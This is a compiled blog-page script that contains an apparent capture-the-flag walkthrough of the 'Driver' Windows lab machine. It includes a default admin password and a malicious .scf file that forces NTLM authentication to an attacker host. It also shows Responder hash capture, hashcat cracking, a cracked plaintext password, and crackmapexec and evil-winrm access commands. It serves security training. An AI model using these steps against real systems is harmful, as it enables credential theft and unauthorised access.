"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[3029],{980:(e,t,s)=>{s.d(t,{A:()=>a});const a=s.p+"assets/images/image-dr-2-a8c26f7bc0f632abffe552a8eb9858d6.png"},2057:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/Driver","editUrl":"https://github.com/danae-pan/Blog/blog/Driver.md","source":"@site/blog/Driver.md","title":"Driver","description":"Task 1","date":"2025-05-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":5.235,"hasTruncateMarker":true,"authors":[],"frontMatter":{"title":"Driver","date":"2025-05-25T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"prevItem":{"title":"Board Light","permalink":"/Blog/blog/BoardLight"},"nextItem":{"title":"Precious","permalink":"/Blog/blog/Precious"}}')},2873:(e,t,s)=>{s.d(t,{A:()=>a});const a=s.p+"assets/images/image-dr-16-55ecfa90176cce9deb2e786c7f67fb39.png"},4221:(e,t,s)=>{s.d(t,{A:()=>a});const a=s.p+"assets/images/image-dr-3-553d51e293be0b7af82c86cf1ada2873.png"},4242:(e,t,s)=>{s.d(t,{A:()=>a});const a=s.p+"assets/images/image-dr-4-6721f07e64b15fe7f34528be404b096d.png"},5787:(e,t,s)=>{s.d(t,{A:()=>a});const a=s.p+"assets/images/image-dr-5-222eb28f5736b4759d4dc4b2a8e7e543.png"},6255:(e,t,s)=>{s.d(t,{A:()=>a});const a=s.p+"assets/images/image-dr-1-967690d0655d5e8dadc181e773374317.png"},6864:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>h,contentTitle:()=>o,default:()=>c,frontMatter:()=>r,metadata:()=>a,toc:()=>d});var a=s(2057),n=s(4848),i=s(8453);const r={title:"Driver",date:new Date("2025-05-25T00:00:00.000Z"),tags:["easy","windows"]},o=void 0,h={authorsImageUrls:[]},d=[{value:"Task 1",id:"task-1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3}];function l(e){const t={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(t.h3,{id:"task-1",children:"Task 1"}),"\n",(0,n.jsx)(t.p,{children:"We're prompted for log on credentials when accessing the target over HTTP. What username is disclosed when looking at the HTTP response headers?"}),"\n",(0,n.jsxs)(t.p,{children:["We use curl with the option for fetching headers only ",(0,n.jsx)(t.code,{children:"curl -I <target_ip>"})," and see on the ",(0,n.jsx)(t.code,{children:"WWW-Authenticate"})," the username admin."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(6255).A+"",width:"1518",height:"456"})}),"\n",(0,n.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,n.jsx)(t.p,{children:"Weak passwords are all too common and this target is no exception. What is the password for this target's login?"}),"\n",(0,n.jsxs)(t.p,{children:["Before using any automated tools, we try with the default, common password ",(0,n.jsx)(t.code,{children:"admin"})," and it gets us in. On the main page we are presented with a MFP Firmware Update Center."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(980).A+"",width:"1768",height:"1200"})}),"\n",(0,n.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,n.jsx)(t.p,{children:"There are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker. What is the file extension that can be uploaded here to trigger that connection?"}),"\n",(0,n.jsxs)(t.p,{children:["The file that is asked here, has the extension ",(0,n.jsx)(t.code,{children:".scf"})," which stands for Shell Command File. This file can be placed on a writable SMB share or web-based file upload to force outbound authentication requests. For more detailed information visit ",(0,n.jsx)(t.a,{href:"https://attack.mitre.org/techniques/T1187/",children:"MITRE ATT&CK"})]}),"\n",(0,n.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,n.jsx)(t.p,{children:"We've intercepted an Net-NTLMv2 hash with Responder. What is the mode in Hashcat required to crack this hash format?"}),"\n",(0,n.jsx)(t.p,{children:"When Responder intercepts a Net-NTLMv2 hash, the format looks like:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{children:"USERNAME::DOMAIN:ServerChallenge:NTProofStr:Blob\n"})}),"\n",(0,n.jsxs)(t.p,{children:["This structure corresponds exactly to the format supported by Hashcat mode 5600 which is backed up by the Hashcat official documentation ",(0,n.jsx)(t.a,{href:"https://hashcat.net/wiki/doku.php?id=example_hashes",children:"Hashcat Generic hash types"})]}),"\n",(0,n.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,n.jsx)(t.p,{children:"What is the tony user's password?"}),"\n",(0,n.jsxs)(t.p,{children:["To solve this task, we will start responder ",(0,n.jsx)(t.code,{children:"sudo responder -I tun0"})," and then upload a scf file to the file share via the printer upload form that would trigger an SMB authentication. We create a file as follows:"]}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{children:"[Shell]\nCommand=2\nIconFile=\\\\<host_ip>\\share\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n"})}),"\n",(0,n.jsx)(t.p,{children:"This works, and the Net-NTLMv2 hash is captured by Responder because this upload is reviewed manually and thus opened as the web page explains."}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(4221).A+"",width:"1516",height:"734"})}),"\n",(0,n.jsxs)(t.p,{children:["As mentioned in the previous task, the full hash string can be cracked using Hashcat mode 5600. We create a file called tony_hash with this hash, we run ",(0,n.jsx)(t.code,{children:"hashcat -m 5600 -a 0 tony_hash.txt /usr/share/wordlists/rockyou.txt"})," and the password is cracked."]}),"\n",(0,n.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,n.jsx)(t.p,{children:"Submit the flag located on the tony user's desktop."}),"\n",(0,n.jsxs)(t.p,{children:["We will first list the shared folders on the target Microsoft-DS by running ",(0,n.jsx)(t.code,{children:"smbclient -L //<target_ip> -U 'tony'"})," using the user tony's password we found in the previous task."]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(4242).A+"",width:"1516",height:"568"})}),"\n",(0,n.jsxs)(t.p,{children:["Then we can try connecting directly to the ",(0,n.jsx)(t.code,{children:"C$"})," default share by running ",(0,n.jsx)(t.code,{children:"smbclient //<target_ip>/C$ -U 'tony'"})," which gave us access denied. We then try ",(0,n.jsx)(t.code,{children:"crackmapexec smb <target_ip> -u tony -p 'liltony' --shares"})]}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(5787).A+"",width:"1674",height:"764"})}),"\n",(0,n.jsx)(t.p,{children:"This validates that the user does not have access but we see that Windows 10 Enterprise is used which by default has WinRM installed and often enabled."}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.code,{children:"crackmapexec winrm <target_ip> -u tony -p liltony"})}),"\n",(0,n.jsx)(t.p,{children:(0,n.jsx)(t.img,{alt:"alt text",src:s(2873).A+"",width:"1674",height:"268"})}),"\n",(0,n.jsxs)(t.p,{children:["Since the service is enabled we can use ",(0,n.jsx)(t.code,{children:"evil-winrm -i <target_ip> -u tony -p liltony"}),". We have access and navigating to tony's Desktop we get the flag by ",(0,n.jsx)(t.code,{children:"cat user.txt"}),"."]})]})}function c(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,n.jsx)(t,{...e,children:(0,n.jsx)(l,{...e})}):l(e)}},8453:(e,t,s)=>{s.d(t,{R:()=>r,x:()=>o});var a=s(6540);const n={},i=a.createContext(n);function r(e){const t=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:r(e.components),a.createElement(i.Provider,{value:t},e.children)}}}]);